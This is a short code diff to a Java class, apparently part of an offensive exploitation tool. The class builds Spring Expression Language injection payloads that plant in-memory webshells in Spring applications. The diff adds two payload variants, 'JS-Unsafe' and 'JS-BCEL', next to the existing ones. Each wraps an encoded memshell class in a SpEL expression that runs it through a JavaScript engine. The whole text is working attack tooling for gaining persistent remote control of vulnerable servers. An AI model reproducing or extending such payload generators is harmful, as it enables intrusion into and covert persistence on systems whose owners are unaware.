@@ -65,7 +65,9 @@ public class SpELExpr implements IExpr {
             return new String[]{
                     "[+] Spring反射组件方案：==>" + System.lineSeparator() + out(SpELMemShellFactory.genSpringMemShell1(memShellClass)) + System.lineSeparator() + " <==",
                     "[+] BCEL方案：==>" + System.lineSeparator() + out(SpELMemShellFactory.genSpringMemShell2(memShellClass)) + System.lineSeparator() + " <==",
+                    "[+] JS-Unsafe方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.UNSAFE).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
                     "[+] JS-BASE64方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
+                    "[+] JS-BCEL方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
                     "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER).replace("'", "''") + "')}") + System.lineSeparator() + " <=="
             };
         } catch (Exception ex) {
